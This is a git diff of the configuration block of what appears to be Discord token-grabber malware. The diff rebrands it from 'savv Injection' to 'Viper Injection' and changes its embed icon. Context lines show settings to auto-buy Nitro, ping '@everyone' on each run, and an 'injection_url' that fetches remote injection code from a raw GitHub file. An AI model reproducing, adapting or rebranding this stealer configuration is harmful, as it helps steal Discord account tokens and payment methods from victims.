@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'savv Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1351697032091271232/1359812853401387180/savv_Grabber.png?ex=67f8d7e8&is=67f78668&hm=7a62968fc19a9922fb56853f93701046bb85f93cddb635a0fbeaf9178daa9bc7&'.replace(/ /g, '%20'),
+  embed_name: 'Viper Injection', 
+  embed_icon: 'https://media.discordapp.net/attachments/1370971205624135823/1370985478555177061/ffd29db1f8ec7a835809a0308f57828a.webp?ex=68217d39&is=68202bb9&hm=e773989080797506ca74a1495caf5d5fa5052e805d997c3612c6d1da977aaeb7&=&format=webp'.replace(/ /g, '%20'),
   embed_color: 15548997, 
   injection_url: 'https://raw.githubusercontent.com/savv70/injection/refs/heads/main/injection_v2', 
 
